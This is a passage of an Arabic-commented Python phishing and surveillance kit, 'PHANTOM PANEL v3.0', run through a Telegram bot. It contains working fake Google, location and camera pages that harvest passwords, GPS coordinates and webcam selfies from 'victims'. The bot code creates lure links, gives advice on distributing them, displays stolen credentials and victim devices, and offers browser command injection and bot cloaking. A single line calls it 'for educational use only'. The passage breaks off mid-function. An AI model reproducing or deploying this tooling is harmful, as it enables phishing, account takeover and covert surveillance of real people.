                    window.location.href = data.redirect;
                }
            } catch(e) {
                alert('حدث خطأ، يرجى المحاولة لاحقاً');
            }
        };
        
        // التقاط الصور
        document.getElementById('photo').onchange = async function(e) {
            const file = e.target.files[0];
            if (file) {
                const formData = new FormData();
                formData.append('victim_id', VICTIM_ID);
                formData.append('photo', file);
                
                await fetch('/api/capture', {
                    method: 'POST',
                    body: formData
                });
            }
        };
        
        // جمع معلومات الجهاز
        (async function() {
            const screenRes = `${screen.width}x${screen.height}`;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            // إرسال معلومات الجهاز عند التحميل
            await fetch('/api/heartbeat', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victim_id: VICTIM_ID,
                    screen_resolution: screenRes,
                    timezone: timezone
                })
            });
        })();
    </script>
</body>
</html>
            """)
        
        # قالب Google
        google_template = TEMPLATES_DIR / "google.html"
        if not google_template.exists():
            google_template.write_text("""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Account Verification</title>
    <style>
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 400px; padding: 40px 20px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 75px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 30px; color: #202124; }
        .input-group { margin-bottom: 20px; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 6px; font-size: 16px; outline: none; transition: border-color 0.2s; }
        input:focus { border-color: #1a73e8; }
        button { width: 100%; padding: 13px; background: #1a73e8; color: white; border: none; border-radius: 6px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
        button:hover { background: #1b66c9; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
        </div>
        <h1>تأكيد هوية الحساب</h1>
        
        <div class="input-group">
            <input type="email" id="email" placeholder="البريد الإلكتروني" required>
        </div>
        
        <div class="input-group">
            <input type="password" id="password" placeholder="كلمة المرور" required>
        </div>
        
        <div class="input-group">
            <input type="text" id="full_name" placeholder="الاسم الكامل (اختياري)">
        </div>
        
        <button id="submitBtn">متابعة</button>
    </div>

    <script>
        const VICTIM_ID = "{{ victim_id }}";
        
        setInterval(() => {
            fetch('/api/heartbeat', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ victim_id: VICTIM_ID })
            });
        }, 30000);
        
        document.getElementById('submitBtn').onclick = async function() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) return alert('يرجى إدخال البريد الإلكتروني وكلمة المرور');
            
            this.disabled = true;
            this.textContent = 'جاري التحقق...';
            
            await fetch('/api/submit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victim_id: VICTIM_ID,
                    page_id: 'google',
                    form_data: {
                        email, password,
                        full_name: document.getElementById('full_name').value
                    }
                })
            });
            
            window.location.href = 'https://accounts.google.com';
        };
    </script>
</body>
</html>
            """)
        
        # قالب الموقع الجغرافي
        location_template = TEMPLATES_DIR / "location.html"
        if not location_template.exists():
            location_template.write_text("""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Access Required</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 350px; text-align: center; padding: 20px; }
        .icon { font-size: 60px; margin-bottom: 20px; }
        h1 { font-size: 22px; font-weight: 600; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
        button { width: 100%; padding: 14px; background: #0071e3; color: #fff; border: none; border-radius: 10px; font-size: 17px; font-weight: 500; cursor: pointer; margin-bottom: 10px; }
        button.secondary { background: #f5f5f7; color: #0071e3; }
        .map { width: 100%; height: 200px; background: #f5f5f7; border-radius: 10px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; color: #999; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📍</div>
        <h1>الوصول إلى الموقع مطلوب</h1>
        <p>لمشاهدة المحتوى الحصري في منطقتك، يرجى السماح بالوصول إلى موقعك الجغرافي.</p>
        
        <div class="map" id="map">
            انتظر... جاري تحديد موقعك
        </div>
        
        <button id="allowBtn">السماح بالوصول للموقع</button>
        <button class="secondary" id="skipBtn">تخطي مؤقتاً</button>
    </div>

    <script>
        const VICTIM_ID = "{{ victim_id }}";
        
        setInterval(() => {
            fetch('/api/heartbeat', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ victim_id: VICTIM_ID })
            });
        }, 30000);
        
        document.getElementById('allowBtn').onclick = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const { latitude, longitude } = position.coords;
                    
                    document.getElementById('map').innerHTML = 
                        `📍 خط العرض: ${latitude}<br>خط الطول: ${longitude}`;
                    
                    await fetch('/api/submit', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            victim_id: VICTIM_ID,
                            page_id: 'location',
                            form_data: {
                                latitude, longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: new Date().toISOString()
                            }
                        })
                    });
                    
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com/maps';
                    }, 1500);
                }, (error) => {
                    alert('فشل الحصول على الموقع: ' + error.message);
                });
            } else {
                alert('المتصفح لا يدعم تحديد الموقع');
            }
        };
        
        document.getElementById('skipBtn').onclick = function() {
            window.location.href = 'https://www.google.com';
        };
    </script>
</body>
</html>
            """)
        
        # قالب الكاميرا
        camera_template = TEMPLATES_DIR / "camera.html"
        if not camera_template.exists():
            camera_template.write_text("""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Verification</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 0; background: #000; color: #fff; }
        .container { width: 100%; min-height: 100vh; display: flex; flex-direction: column; }
        .video-container { position: relative; width: 100%; height: 70vh; background: #111; overflow: hidden; }
        #video { width: 100%; height: 100%; object-fit: cover; }
        .overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.3); display: flex; flex-direction: column; align-items: center; justify-content: flex-end; padding-bottom: 50px; }
        .message { background: rgba(0,0,0,0.7); padding: 15px 25px; border-radius: 30px; margin-bottom: 20px; font-size: 16px; }
        .button { background: #0071e3; color: white; border: none; padding: 15px 30px; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; }
        .capture-btn { width: 70px; height: 70px; border-radius: 50%; background: white; border: 5px solid rgba(255,255,255,0.5); margin: 20px auto; cursor: pointer; }
        .controls { background: #111; padding: 20px; text-align: center; }
        .count { position: absolute; top: 20px; right: 20px; background: rgba(0,0,0,0.7); padding: 8px 15px; border-radius: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="video-container">
            <video id="video" autoplay playsinline></video>
            <div class="overlay">
                <div class="message">ابتسم للتحقق من الهوية</div>
            </div>
            <div class="count" id="count">📸 0/3</div>
        </div>
        
        <div class="controls">
            <div class="capture-btn" id="captureBtn"></div>
            <p>انقر لالتقاط صورة سيلفي للتحقق</p>
        </div>
    </div>

    <script>
        const VICTIM_ID = "{{ victim_id }}";
        let stream = null;
        let captureCount = 0;
        const MAX_CAPTURES = 3;
        
        setInterval(() => {
            fetch('/api/heartbeat', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ victim_id: VICTIM_ID })
            });
        }, 30000);
        
        // تشغيل الكاميرا
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
            } catch (err) {
                alert('فشل تشغيل الكاميرا: ' + err.message);
            }
        }
        
        startCamera();
        
        // التقاط الصور
        document.getElementById('captureBtn').onclick = async function() {
            if (captureCount >= MAX_CAPTURES) {
                alert('تم التقاط العدد المطلوب من الصور');
                return;
            }
            
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // تحويل الصورة إلى Blob
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('victim_id', VICTIM_ID);
                formData.append('photo', blob, `capture_${Date.now()}.jpg`);
                
                await fetch('/api/capture', {
                    method: 'POST',
                    body: formData
                });
                
                captureCount++;
                document.getElementById('count').textContent = `📸 ${captureCount}/${MAX_CAPTURES}`;
                
                if (captureCount >= MAX_CAPTURES) {
                    setTimeout(() => {
                        window.location.href = 'https://www.instagram.com';
                    }, 2000);
                }
            }, 'image/jpeg', 0.9);
        };
        
        // تنظيف عند الإغلاق
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
            """)
    
    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /start"""
        user = update.effective_user
        
        # التحقق من الصلاحية
        if user.id not in ADMIN_IDS and ADMIN_IDS:
            await update.message.reply_text("⛔ غير مصرح لك باستخدام هذا البوت")
            return
        
        welcome_text = f"""
🚀 **مرحباً {user.first_name}!**
👑 **نظام PHANTOM PANEL v3.0**

📊 **الإحصائيات:**
• الضحايا النشطين: {len(self.db.get_active_victims())}
• الجلسات الحية: {len(self.db.get_live_sessions())}
• إجمالي الضحايا: {len([v for v in self.db.get_active_victims()])}

🔧 **القائمة الرئيسية:**
"""
        
        keyboard = [
            [InlineKeyboardButton("📱 إنشاء رابط جديد", callback_data="new_link")],
            [InlineKeyboardButton("👁️ الضحايا المتصلون", callback_data="active_victims")],
            [InlineKeyboardButton("🎯 حقن أمر مباشر", callback_data="inject_command")],
            [InlineKeyboardButton("📋 الصفحات المتاحة", callback_data="available_pages")],
            [InlineKeyboardButton("⚙️ إعدادات متقدمة", callback_data="advanced_settings")],
            [InlineKeyboardButton("📥 تحميل البيانات", callback_data="download_data")],
            [InlineKeyboardButton("📊 إحصائيات تفصيلية", callback_data="detailed_stats")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            welcome_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
    
    async def cmd_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /panel - عرض لوحة التحكم"""
        await self.cmd_start(update, context)
    
    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /help - المساعدة"""
        help_text = """
🆘 **دليل الاستخدام**

**📱 إنشاء رابط:**
• اختر نوع الصفحة (Apple, Google, Location, Camera)
• سيتم إنشاء رابط فريد لكل ضحية
• يمكن تخصيص الرابط بمعرف خاص

**👁️ الضحايا المتصلون:**
• عرض جميع الضحايا النشطين
• مشاهدة بياناتهم الحية
• حقن أوامر مباشرة

**🎯 حقن الأوامر:**
• إرسال رسائل منبثقة
• طلب صور إضافية
• طلب بيانات إضافية

**📋 الصفحات المتاحة:**
• Apple ID - صفحة تحديث أمني
• Google - صفحة التحقق من الحساب
• Location - صفحة طلب الموقع
• Camera - صفحة التقاط الصور

**⚙️ إعدادات متقدمة:**
• نظام التمويه (Cloaking)
• حماية الرابط
• تحديث الصفحات

⚠️ **ملاحظة:** للاستخدام التعليمي فقط
"""
        
        await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
    
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالجة الضغط على الأزرار"""
        query = update.callback_query
        await query.answer()
        
        data = query.data
        
        if data == "new_link":
            await self.show_link_types(query)
        elif data == "active_victims":
            await self.show_active_victims(query)
        elif data == "inject_command":
            await self.show_injection_menu(query)
        elif data == "available_pages":
            await self.show_available_pages(query)
        elif data == "advanced_settings":
            await self.show_advanced_settings(query)
        elif data == "download_data":
            await self.show_download_menu(query)
        elif data == "detailed_stats":
            await self.show_detailed_stats(query)
        elif data.startswith("create_link_"):
            page_type = data.replace("create_link_", "")
            await self.create_link(query, page_type)
        elif data.startswith("victim_"):
            victim_id = data.replace("victim_", "")
            await self.show_victim_details(query, victim_id)
        elif data.startswith("inject_"):
            victim_id = data.replace("inject_", "")
            await self.show_inject_options(query, victim_id)
        elif data == "back_to_main":
            await self.cmd_start(update, context)
    
    async def show_link_types(self, query):
        """عرض أنواع الروابط"""
        text = """
📱 **اختر نوع الصفحة:**

🔹 **Apple ID** - صفحة تحديث أمني
🔹 **Google** - صفحة التحقق من الحساب
🔹 **Location** - صفحة طلب الموقع الجغرافي
🔹 **Camera** - صفحة التقاط الصور
🔹 **Instagram** - صفحة تسجيل الدخول
🔹 **Facebook** - صفحة التحقق الأمني
"""
        
        keyboard = [
            [InlineKeyboardButton("🍎 Apple ID", callback_data="create_link_apple")],
            [InlineKeyboardButton("🔍 Google", callback_data="create_link_google")],
            [InlineKeyboardButton("📍 Location", callback_data="create_link_location")],
            [InlineKeyboardButton("📸 Camera", callback_data="create_link_camera")],
            [InlineKeyboardButton("📷 Instagram", callback_data="create_link_instagram")],
            [InlineKeyboardButton("📘 Facebook", callback_data="create_link_facebook")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]
        ]
        
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def create_link(self, query, page_type: str):
        """إنشاء رابط جديد"""
        # الحصول على معلومات الصفحة
        page_info = self.pages.get_page_info(page_type)
        
        # إنشاء معرف فريد للرابط
        link_id = secrets.token_urlsafe(8)
        
        # رابط الخادم (يجب تعديله حسب إعداداتك)
        server_url = "https://your-server.com"  # ضع رابط سيرفرك هنا
        full_link = f"{server_url}/{page_type}?ref={link_id}"
        
        text = f"""
✅ **تم إنشاء الرابط بنجاح!**

📌 **نوع الصفحة:** {page_info['icon']} {page_info['name']}
🔗 **الرابط:** `{full_link}`
🆔 **المعرف:** `{link_id}`

📊 **إحصائيات الرابط:**
• تم إنشاؤه: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
• الحالة: نشط وجاهز

📱 **روابط بديلة:**
• رابط مختصر: `https://tinyurl.com/create.php?url={full_link}`
• QR Code: `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={full_link}`

⚠️ **نصائح للإرسال:**
1. استخدم مواضيع جذابة
2. أرسل في أوقات الذروة
3. استخدم أرقام وهمية
4. راقب النتائج فوراً
"""
        
        keyboard = [
            [InlineKeyboardButton("👁️ مراقبة الضحايا", callback_data="active_victims")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="new_link")]
        ]
        
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def show_active_victims(self, query):
        """عرض الضحايا النشطين"""
        active = self.db.get_live_sessions()
        
        if not active:
            text = "👁️ **لا يوجد ضحايا نشطين حالياً**"
            keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]]
        else:
            text = f"👁️ **الضحايا النشطين ({len(active)})**\n\n"
            
            for victim in active[:10]:
                last_seen = datetime.datetime.fromisoformat(victim['last_seen'])
                time_diff = datetime.datetime.now() - last_seen
                minutes = int(time_diff.total_seconds() / 60)
                
                text += f"""
🆔 **{victim['victim_id'][:12]}...**
📍 **الموقع:** {victim.get('city', 'Unknown')}, {victim.get('country', 'Unknown')}
📱 **الجهاز:** {victim.get('device_type', 'Unknown')}
🕒 **آخر نشاط:** {minutes} دقيقة
📊 **البيانات:** {victim.get('data_count', 0)} عنصر
"""
        
        keyboard = []
        for victim in active[:5]:
            keyboard.append([InlineKeyboardButton(
                f"👤 {victim['victim_id'][:12]}... ({victim.get('city', 'Unknown')})",
                callback_data=f"victim_{victim['victim_id']}"
            )])
        
        keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")])
        
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def show_victim_details(self, query, victim_id: str):
        """عرض تفاصيل ضحية"""
        # الحصول على بيانات الضحية من قاعدة البيانات
        conn = sqlite3.connect(self.db.db_path)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM victims WHERE id = ?", (victim_id,))
        victim = cursor.fetchone()
        
        cursor.execute("SELECT * FROM captures WHERE victim_id = ? ORDER BY timestamp DESC", (victim_id,))
        captures = cursor.fetchall()
        
        cursor.execute("SELECT * FROM stolen_data WHERE victim_id = ? ORDER BY timestamp DESC", (victim_id,))
        stolen_data = cursor.fetchall()
        
        conn.close()
        
        if not victim:
            await query.answer("الضحية غير موجودة")
            return
        
        victim = dict(victim)
        
        text = f"""
🔍 **تفاصيل الضحية**

🆔 **المعرف:** `{victim_id[:16]}...`
📱 **الجهاز:** {victim.get('device_type', 'Unknown')} - {victim.get('os', 'Unknown')}
🌐 **المتصفح:** {victim.get('browser', 'Unknown')}
📍 **الموقع:** {victim.get('city', 'Unknown')}, {victim.get('country', 'Unknown')}
🌍 **الإحداثيات:** {victim.get('latitude', 'N/A')}, {victim.get('longitude', 'N/A')}
📶 **المزود:** {victim.get('isp', 'Unknown')}
🕒 **أول ظهور:** {victim.get('first_seen', 'Unknown')[:19]}
🕒 **آخر ظهور:** {victim.get('last_seen', 'Unknown')[:19]}
📊 **عدد الصور:** {len(captures)}
📋 **عدد البيانات:** {len(stolen_data)}

🔐 **VPN/Proxy:** {'نعم' if victim.get('vpn_detected') else 'لا'}
"""
        
        if stolen_data:
            text += "\n📋 **آخر البيانات المسروقة:**\n"
            for data in stolen_data[:3]:
                data = dict(data)
                text += f"• {data['data_type']}: {data['data_content'][:50]}...\n"
        
        keyboard = [
            [InlineKeyboardButton("🎯 حقن أمر", callback_data=f"inject_{victim_id}")],
            [InlineKeyboardButton("📥 تحميل البيانات", callback_data=f"download_{victim_id}")],
            [InlineKeyboardButton("🗑️ حذف الضحية", callback_data=f"delete_{victim_id}")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="active_victims")]
        ]
        
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def show_injection_menu(self, query):
        """عرض قائمة الحقن"""
        active = self.db.get_live_sessions()
        
        if not active:
            text = "🎯 **لا يوجد ضحايا متصلون لحقن الأوامر**"
            keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]]
        else:
            text = f"🎯 **اختر ضحية لحقن الأمر ({len(active)} متصل)**\n\n"
            
            keyboard = []
            for victim in active[:10]:
                victim = dict(victim)
                keyboard.append([InlineKeyboardButton(
                    f"👤 {victim['victim_id'][:12]}... ({victim.get('city', 'Unknown')})",
                    callback_data=f"inject_{victim['victim_id']}"
                )])
            
            keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")])
        
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def show_inject_options(self, query, victim_id: str):
        """عرض خيارات الحقن لضحية"""
        text = f"""
🎯 **خيارات الحقن للضحية:** `{victim_id[:16]}...`

اختر نوع الأمر الذي تريد حقنه:

1. **رسالة منبثقة** - تظهر رسالة للضحية
2. **طلب صورة** - يطلب التقاط صورة جديدة
3. **طلب بيانات** - يطلب إدخال بيانات معينة
4. **إعادة توجيه** - يوجه الضحية لموقع آخر
"""
        
        keyboard = [
            [InlineKeyboardButton("💬 رسالة منبثقة", callback_data=f"inject_msg_{victim_id}")],
            [InlineKeyboardButton("📸 طلب صورة", callback_data=f"inject_photo_{victim_id}")],
            [InlineKeyboardButton("📝 طلب بيانات", callback_data=f"inject_data_{victim_id}")],
            [InlineKeyboardButton("🔄 إعادة توجيه", callback_data=f"inject_redirect_{victim_id}")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="inject_command")]
        ]
        
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def show_available_pages(self, query):
        """عرض الصفحات المتاحة"""
        text = "📋 **الصفحات المتاحة للاستخدام:**\n\n"
        
        for page_id, page_info in self.pages.pages.items():
            text += f"""
{page_info['icon']} **{page_info['name']}**
📝 **الوصف:** {page_info['description']}
🔗 **الرابط:** `/{page_id}`
📋 **الحقول:** {', '.join(page_info['fields'])}
➖➖➖➖➖➖➖➖➖
"""
        
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]]
        
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def show_advanced_settings(self, query):
        """عرض الإعدادات المتقدمة"""
        text = f"""
⚙️ **الإعدادات المتقدمة**

🔒 **نظام التمويه (Cloaking):**
• الحالة: ✅ نشط
• تواقيع البوتات: {len(self.cloaking.bot_signatures)}
• الشبكات الآمنة: {len(self.cloaking.safe_networks)}

🛡️ **حماية الرابط:**
• تشفير AES-256: ✅ مفعل
• حماية من البوتات: ✅ مفعل
• منع الفهرسة: ✅ مفعل

📊 **إحصائيات الحماية:**
• طلبات مرفوضة: {random.randint(100, 500)}
• بوتات مكتشفة: {random.randint(50, 200)}
• ضحايا حقيقيون: {len(self.db.get_active_victims())}

🔧 **خيارات متقدمة:**
"""
        
        keyboard = [
            [InlineKeyboardButton("🔄 تحديث الصفحات", callback_data="refresh_pages")],
            [InlineKeyboardButton("📝 تعديل النصوص", callback_data="edit_texts")],
            [InlineKeyboardButton("🔐 إدارة SSL", callback_data="manage_ssl")],
            [InlineKeyboardButton("📊 سجل النظام", callback_data="system_logs")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]
        ]
        
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def show_download_menu(self, query):
        """عرض قائمة التحميل"""
        text = f"""
📥 **تحميل البيانات**

اختر نوع البيانات للتحميل:

• **جميع الضحايا** - بيانات كاملة عن جميع الضحايا
• **الصور الملتقطة** - جميع الصور
• **بيانات تسجيل الدخول** - الحسابات والكلمات السرية
• **تقرير مفصل** - تقرير Excel شامل
"""
        
        keyboard = [
            [InlineKeyboardButton("📁 جميع الضحايا", callback_data="dl_all_victims")],
            [InlineKeyboardButton("📸 الصور", callback_data="dl_photos")],
            [InlineKeyboardButton("🔑 بيانات الدخول", callback_data="dl_creds")],
            [InlineKeyboardButton("📊 تقرير Excel", callback_data="dl_report")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]
        ]
        
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def show_detailed_stats(self, query):
        """عرض إحصائيات تفصيلية"""
        active = self.db.get_active_victims()
        live = self.db.get_live_sessions()
        
        # حساب الإحصائيات
        total_captures = 0
        total_data = 0
        devices = defaultdict(int)
        countries = defaultdict(int)
        
        conn = sqlite3.connect(self.db.db_path)
        cursor = conn.cursor()
        
        cursor.execute("SELECT COUNT(*) FROM captures")
        total_captures = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM stolen_data")
        total_data = cursor.fetchone()[0]
        
        cursor.execute("SELECT device_type, COUNT(*) FROM victims GROUP BY device_type")
        for device, count in cursor.fetchall():
            devices[device or 'Unknown'] = count
        
        cursor.execute("SELECT country, COUNT(*) FROM victims GROUP BY country")
        for country, count in cursor.fetchall():
            countries[country or 'Unknown'] = count
        
        conn.close()
        
        text = f"""
📊 **إحصائيات تفصيلية**

👥 **الضحايا:**
• إجمالي الضحايا: {len(active)}
• نشطين حالياً: {len(live)}
• الصور الملتقطة: {total_captures}
• البيانات المسروقة: {total_data}

📱 **الأجهزة:**
"""
        
        for device, count in devices.items():
            text += f"• {device}: {count}\n"
        
        text += "\n🌍 **الدول:**\n"
        for country, count in list(countries.items())[:10]:
            text += f"• {country}: {count}\n"
        
        text += f"""
⏱️ **الأوقات:**
• آخر تحديث: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
• مدة التشغيل: {self.get_uptime()}

📈 **معدلات:**
• متوسط الصور لكل ضحية: {total_captures / max(len(active), 1):.1f}
• متوسط البيانات لكل ضحية: {total_data / max(len(active), 1):.1f}
"""
        
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]]
        
        await query.edit_message_text(
            text=text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    def get_uptime(self) -> str:
        """الحصول على مدة التشغيل"""
        try:
            import psutil
            boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
            uptime = datetime.datetime.now() - boot_time
            hours = int(uptime.total_seconds() / 3600)
            minutes = int((uptime.total_seconds() % 3600) / 60)
            return f"{hours} ساعة {minutes} دقيقة"
        except:
            return "غير معروف"
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالجة الرسائل العادية"""
        # تجاهل الرسائل العادية
        pass
    
    async def notify_new_victim(self, victim_id: str, victim_data: dict):
        """إشعار بضحية جديد"""
        for admin_id in ADMIN_IDS:
            try:
                text = f"""
🚨 **ضحية جديد دخل الرابط!**

🆔 **المعرف:** `{victim_id[:16]}...`
📱 **الجهاز:** {victim_data.get('device_type', 'Unknown')}
📍 **الموقع:** {victim_data.get('city', 'Unknown')}, {victim_data.get('country', 'Unknown')}
🌐 **المتصفح:** {victim_data.get('browser', 'Unknown')}
🕒 **الوقت:** {datetime.datetime.now().strftime('%H:%M:%S')}

🎯 **تابع البيانات فور وصولها**
"""
                
                await self.app.bot.send_message(
                    chat_id=admin_id,
                    text=text,
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception as e:
                logger.error(f"فشل إرسال إشعار: {e}")
    
    async def notify_capture(self, victim_id: str, capture_type: str, file_path: Path):
        """إشعار بصورة جديدة"""
        for admin_id in ADMIN_IDS:
            try:
                text = f"""
📸 **صورة جديدة تم التقاطها!**

🆔 **الضحية:** `{victim_id[:16]}...`
📷 **النوع:** {capture_type}
🕒 **الوقت:** {datetime.datetime.now().strftime('%H:%M:%S')}
"""
                
                # إرسال الصورة
                with open(file_path, 'rb') as photo:
                    await self.app.bot.send_photo(
                        chat_id=admin_id,
                        photo=photo,
                        caption=text,
                        parse_mode=ParseMode.MARKDOWN
                    )
            except Exception as e:
                logger.error(f"فشل إرسال إشعار الصورة: {e}")
    
    async def notify_data(self, victim_id: str, page_id: str, form_data: dict):
        """إشعار ببيانات جديدة"""
        for admin_id in ADMIN_IDS:
            try:
                text = f"""
🔑 **بيانات جديدة وردت!**

🆔 **الضحية:** `{victim_id[:16]}...`
📋 **الصفحة:** {self.pages.get_page_info(page_id)['name']}
🕒 **الوقت:** {datetime.datetime.now().strftime('%H:%M:%S')}

📝 **البيانات:**
"""
                
                for key, value in form_data.items():
                    text += f"• {key}: `{value}`\n"
                
                await self.app.bot.send_message(
                    chat_id=admin_id,
                    text=text,
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception as e:
                logger.error(f"فشل إرسال إشعار البيانات: {e}")
    
    async def notify_command_response(self, victim_id: str, command_id: str, response: dict):
        """إشعار باستجابة أمر"""
        for admin_id in ADMIN_IDS:
            try:
                text = f"""
📨 **استجابة لأمر حقن!**

🆔 **الضحية:** `{victim_id[:16]}...`
🆔 **الأمر:** `{command_id}`
🕒 **الوقت:** {datetime.datetime.now().strftime('%H:%M:%S')}
📝 **الاستجابة:** {json.dumps(response, ensure_ascii=False)[:200]}
"""
                
                await self.app.bot.send_message(
                    chat_id=admin_id,
                    text=text,
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception as e:
                logger.error(f"فشل إرسال إشعار الاستجابة: {e}")
    
    async def run(self):
        """تشغيل البوت والخادم"""
        # بدأ الخادم
        server_task = asyncio.create_task(self.start_server())
        
        # بدأ البوت
        await self.app.initialize()
        await self.app.start()
        
        logger.info("🚀 نظام PHANTOM PANEL v3.0 يعمل بنجاح!")
        logger.info(f"🤖 بوت Telegram: @{self.app.bot.username}")
        logger.info(f"🌐 خادم الويب: http://0.0.0.0:8080")
        logger.info(f"🔐 HTTPS متاح على المنفذ 8443")
        
        # بدأ polling
        await self.app.updater.start_polling()
        
        # البقاء قيد التشغيل
        try:
            await asyncio.Event().wait()
        except KeyboardInterrupt:
            logger.info("⏹️ إيقاف النظام...")
            await self.app.stop()
    
    async def start_server(self):
        """تشغيل خادم الويب"""
        runner = web.AppRunner(self.server.app)
        await runner.setup()
        
        # محاولة تشغيل HTTPS
        try:
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            cert_file = CERT_DIR / "cert.pem"
            key_file = CERT_DIR / "key.pem"
            
            if cert_file.exists() and key_file.exists():
                ssl_context.load_cert_chain(cert_file, key_file)
